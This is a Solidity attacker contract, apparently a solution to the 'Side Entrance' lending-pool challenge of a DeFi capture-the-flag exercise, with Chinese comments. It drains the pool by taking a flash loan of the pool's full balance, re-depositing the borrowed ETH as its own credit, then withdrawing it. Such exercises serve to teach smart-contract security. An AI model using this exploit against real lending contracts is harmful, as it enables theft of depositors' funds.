// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private pool;
    address private owner;
    
    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
        owner = msg.sender;
    }
    
    function execute() external payable override {
        // 将闪电贷借到的ETH存入pool，这样pool的余额保持不变
        // 但是我们的balances[address(this)]会增加
        pool.deposit{value: msg.value}();
    }
    
    function attack(address recovery) external {
        require(msg.sender == owner, "Only owner can attack");
        
        // 获取pool中的所有ETH数量
        uint256 poolBalance = address(pool).balance;
        
        // 发起闪电贷
        pool.flashLoan(poolBalance);
        
        // 闪电贷完成后，提取我们存入的ETH
        pool.withdraw();
        
        // 将ETH转给recovery地址
        payable(recovery).transfer(address(this).balance);
    }
    
    // 接收ETH
    receive() external payable {}
} 